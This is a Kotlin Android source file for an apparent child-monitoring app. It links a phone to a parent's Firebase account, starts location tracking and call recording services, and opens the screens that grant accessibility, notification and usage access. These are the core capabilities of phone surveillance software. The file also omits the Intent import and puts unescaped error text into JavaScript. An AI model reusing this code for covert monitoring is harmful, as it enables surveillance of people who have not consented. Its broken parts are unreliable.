package com.abuzahra.tracker

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.net.Uri
import android.provider.Settings
import android.util.Log
import android.webkit.JavascriptInterface
import androidx.core.content.ContextCompat
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.FirebaseFirestoreException
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.tasks.await
import com.abuzahra.tracker.services.TrackerService
import com.abuzahra.tracker.services.CallRecorderService
import com.abuzahra.tracker.services.DataSyncWorker

class ChildWebInterface(private val mContext: Context) {
    private val auth = FirebaseAuth.getInstance()
    private val db = FirebaseFirestore.getInstance()

    @JavascriptInterface
    fun linkDevice(code: String) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val doc = db.collection("linking_codes").document(code).get().await()
                if (!doc.exists()) { sendResult("window.onLinkError('الكود غير صحيح.')"); return@launch }

                val parentUid = doc.getString("parent_uid")
                if (parentUid.isNullOrEmpty()) { sendResult("window.onLinkError('خطأ في البيانات.')"); return@launch }

                if (auth.currentUser == null) {
                    try { auth.signInAnonymously().await() } catch (e: Exception) {
                        sendResult("window.onLinkError('فشل المصادقة.')"); return@launch
                    }
                }

                val deviceId = Settings.Secure.getString(mContext.contentResolver, Settings.Secure.ANDROID_ID)
                val data = mapOf("device_id" to deviceId, "last_seen" to System.currentTimeMillis(), "battery_level" to 100, "app_name" to "Device Linked")

                try {
                    db.collection("parents").document(parentUid).collection("children").document(deviceId).set(data).await()
                } catch (e: FirebaseFirestoreException) {
                    sendResult("window.onLinkError('اضغط PUBLISH في قواعد Firebase.')"); return@launch
                }

                db.collection("linking_codes").document(code).delete().await()
                SharedPrefsManager.saveData(mContext, parentUid, deviceId)
                startAllServices()
                sendResult("window.onLinkSuccess()")
            } catch (e: Exception) { sendResult("window.onLinkError('خطأ: ${e.message}')") }
        }
    }

    @JavascriptInterface
    fun startServices() { startAllServices() }

    private fun startAllServices() {
        // بدء خدمة الموقع
        val intent = Intent(mContext, TrackerService::class.java)
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) mContext.startForegroundService(intent) else mContext.startService(intent)
        
        // بدء خدمة تسجيل المكالمات
        val recIntent = Intent(mContext, CallRecorderService::class.java)
        recIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) mContext.startForegroundService(recIntent) else mContext.startService(recIntent)
        
        DataSyncWorker.startImmediate(mContext)
    }
    
    @JavascriptInterface
    fun requestSpecialPermission(type: String) {
        val intent: Intent? = when (type) {
            "accessibility" -> Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            "notification" -> Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
            "overlay" -> Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:${mContext.packageName}"))
            "usage" -> Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
            else -> null
        }
        intent?.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        if (intent != null) mContext.startActivity(intent)
    }

    private fun sendResult(js: String) { 
        CoroutineScope(Dispatchers.Main).launch { (mContext as MainActivity).webView.evaluateJavascript(js, null) } 
    }
}
